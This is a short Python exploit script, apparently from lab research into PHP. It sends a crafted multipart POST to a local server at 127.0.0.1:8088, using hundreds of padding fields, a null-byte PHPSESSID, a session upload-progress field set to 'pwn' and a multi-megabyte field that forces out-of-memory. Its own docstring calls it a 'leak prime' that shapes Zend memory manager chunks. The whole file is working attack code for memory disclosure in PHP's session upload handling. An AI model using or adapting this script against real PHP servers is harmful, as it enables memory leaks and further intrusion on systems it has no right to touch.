#!/usr/bin/env python3
"""Leak prime whose pre-file POST fields force extra Zend MM chunks.

usage: send_a_bigfields.py NV VL HUGE_MB [BNDLEN]
- NV fields with VL-byte values (first NV-1 registered; the NV-th triggers
  max_input_vars if NV=1001)
- PHPSESSID = \\x00, PROGRESS, file part (FILE_START -> new id), huge OOM field
"""
import socket,sys
NV=int(sys.argv[1]); VL=int(sys.argv[2]); HUGE=int(sys.argv[3]) if len(sys.argv)>3 else 12
BNL=int(sys.argv[4]) if len(sys.argv)>4 else 17
BND=b'S'*BNL
parts=[]
for i in range(NV):
    parts.append({'name':('f%04d'%i)[:5],'data':b'V'*VL})
parts.append({'name':'PHPSESSID','data':b'\x00'})
parts.append({'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'})
parts.append({'name':'f','filename':'a.txt','data':b'A'*64})
parts.append({'name':'big','data':b'B'*(HUGE*1024*1024)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=40); s.settimeout(40)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
